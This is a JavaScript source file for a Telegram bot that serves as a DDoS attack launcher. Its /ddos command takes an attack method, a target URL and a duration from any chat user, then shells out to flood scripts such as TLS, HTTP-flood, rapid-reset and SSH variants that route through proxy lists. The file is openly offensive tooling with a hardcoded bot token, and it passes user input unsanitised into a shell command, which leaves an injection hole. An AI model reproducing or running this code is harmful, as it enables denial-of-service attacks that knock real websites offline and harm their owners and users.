const TelegramBot = require('node-telegram-bot-api');
const exec = require('child_process').exec;
const util = require('util');

const bot = new TelegramBot('7618071329:AAGUW39cj_qzihRP3XOwRqWw0cZ_X7upY8o', { polling: true });
const ownerChatId = '6434916607';

const commandUsageList = [];
const validMethods = new Set([
  'kill', 'strike', 'flood', 'tls2', 'bypass', 'tls', 'ninja', 'mix', 'raw', 
  'rapid-reset', 'pidoras', 'http-x', 'ssh', 'SKYNET-TLS', 'SEN-TLS', 'star-tls', 'ELSTARO-TLS'
]);

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `💀 WARNING: You've entered a dangerous zone, hacker. 💀

This is your command interface for executing **DDoS attacks**.

⚡ Usage: /ddos <method> <url> <time>

🚨 LIST OF METHODS AVAILABLE FOR YOU TO EXECUTE: 🚨
- kill
- strike
- flood
- tls2
- bypass
- tls
- ninja
- mix
- raw
- rapid-reset
- pidoras
- http-x
- ssh
- SKYNET-TLS
- SEN-TLS
- star-tls
- ELSTARO-TLS

⚠️ **Warning**: Only use these methods if you are fully aware of the consequences. Unauthorized use will be tracked. ⚠️`);
});

bot.onText(/\/ddos (.+) (.+) (.+)/, async (msg, match) => {
  const methods = match[1];
  const url = match[2];
  let time = Math.min(parseInt(match[3]), 300);

  if (!validMethods.has(methods)) {
    bot.sendMessage(msg.chat.id, '💀 ERROR: Invalid method detected! 💀\n\nOnly authorized methods can be executed. Retry with a valid method.');
    return;
  }

  if (time <= 0 || time > 300) {
    bot.sendMessage(msg.chat.id, '⚡ ERROR: Attack time is invalid! ⚡\n\nMax time is 300 seconds. Adjust the attack duration and try again.');
    return;
  }

  let command = '';
  switch (methods) {
    case 'kill':
      command = `node StarsXKill.js ${url} ${time} 100 10`;
      break;
    case 'strike':
      command = `node StarsXStrike.js GET ${url} ${time} 10 90 proxy.txt --full`;
      break;
    case 'flood':
      command = `node flood.js ${url} ${time} 200 2 proxy.txt`;
      break;
    case 'tls2':
      command = `node tls.js ${url} ${time} 200 2 proxy.txt`;
      break;
    case 'bypass':
      command = `node StarsXBypass.js ${url} ${time} 100 10 proxy.txt`;
      break;
    case 'tls':
      command = `node StarsXTls.js ${url} ${time} 100 10`;
      break;
    case 'ninja':
      command = `node StarsXNinja.js ${url} ${time}`;
      break;
    case 'mix':
      command = `node StarsXMix.js ${url} ${time} 100 10 proxy.txt`;
      break;
    case 'raw':
      command = `node StarsXRaw.js ${url} ${time}`;
      break;
    case 'rapid-reset':
      command = `node StarsXRapid-Reset.js PermenMD ${time} 10 proxy.txt 80 ${url}`;
      break;
    case 'pidoras':
      command = `node StarsXPidoras.js ${url} ${time} 80 10 proxy.txt`;
      break;
    case 'http-x':
      command = `node HTTP-X.js ${url} ${time} 80 10 proxy.txt`;
      break;
    case 'ssh':
      command = `node StarsXSsh.js ${url} 22 root ${time}`;
      break;
    case 'SKYNET-TLS':
      command = `node SKYNET-TLS.js ${url} ${time} 200 10 proxy.txt`;
      break;
    case 'SEN-TLS':
      command = `node SEN-TLS.js ${url} ${time} 200 10 proxy.txt`;
      break;
    case 'star-tls':
      command = `node star-tls.js ${url} ${time} 200 10 proxy.txt`;
      break;
    case 'ELSTARO-TLS':
      command = `node ELSTARO-TLS.js ${url} ${time} 200 10 proxy.txt`;
      break;
  }

  // Log to command usage
  commandUsageList.push({
    user: msg.from.username,
    methods,
    url,
    time,
    timestamp: new Date().toISOString(),
  });

  // Notify owner
  const ownerNotification = `🚨 WARNING: User ${msg.from.username} has initiated a command:\nMethods: ${methods}\nURL: ${url}\nTime: ${time}`;
  bot.sendMessage(ownerChatId, ownerNotification);

  bot.sendMessage(msg.chat.id, `⚡ ATTACK IN PROGRESS ⚡\nMethods: ${methods}\nURL: ${url}\nTime: ${time}`);

  try {
    const { stdout, stderr } = await execPromise(command);

    if (stderr) {
      bot.sendMessage(msg.chat.id, `🔥 ERROR: Something went wrong! 🔥\nDetails: ${stderr}`);
      return;
    }

    const responseMessage = `💥 ATTACK COMPLETED 💥\nMethods: ${methods}\nURL: ${url}\nTime: ${time}\nResult: ${stdout}`;
    bot.sendMessage(msg.chat.id, responseMessage);
  } catch (error) {
    bot.sendMessage(msg.chat.id, `💀 CRITICAL ERROR 💀\nDetails: ${error.message}`);
  }
});

bot.onText(/\/list/, (msg) => {
  if (msg.from.id.toString() !== ownerChatId) {
    bot.sendMessage(msg.chat.id, '💀 ERROR: You do not have permission to access this feature. 💀');
    return;
  }

  let listMessage = '🚨 COMMAND USAGE LOG 🚨\n';
  commandUsageList.forEach((usage) => {
    const currentTime = new Date().getTime();
    const endTime = new Date(usage.timestamp).getTime() + (usage.time * 1000);
    if (endTime > currentTime) {
      listMessage += `\nUser: ${usage.user}\nMethods: ${usage.methods}\nURL: ${usage.url}\nTime: ${usage.time}\nTimestamp: ${usage.timestamp}\n`;
    }
  });
  bot.sendMessage(msg.chat.id, listMessage || '💀 No active commands found. 💀');
});

let runningProcess = null;

bot.onText(/\/stop/, (msg) => {
  if (msg.from.id.toString() !== ownerChatId) {
    bot.sendMessage(msg.chat.id, '💀 ERROR: You do not have permission to stop attacks. 💀');
    return;
  }

  if (runningProcess) {
    runningProcess.kill();
    bot.sendMessage(msg.chat.id, '⚠️ DDoS process has been terminated. ⚠️');
    runningProcess = null;
  } else {
    bot.sendMessage(msg.chat.id, '⚠️ No DDoS process is currently running. ⚠️');
  }
});

function createButton(text, url) {
  return { text, url };
}

bot.onText(/\/http (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
  const button = createButton('Click here to check', url);
  bot.sendMessage(msg.chat.id, '⚡ Click the link below to check the status:', {
    reply_markup: {
      inline_keyboard: [[button]]
    }
  });
});

// Promisify exec for async/await usage
const execPromise = util.promisify(exec);
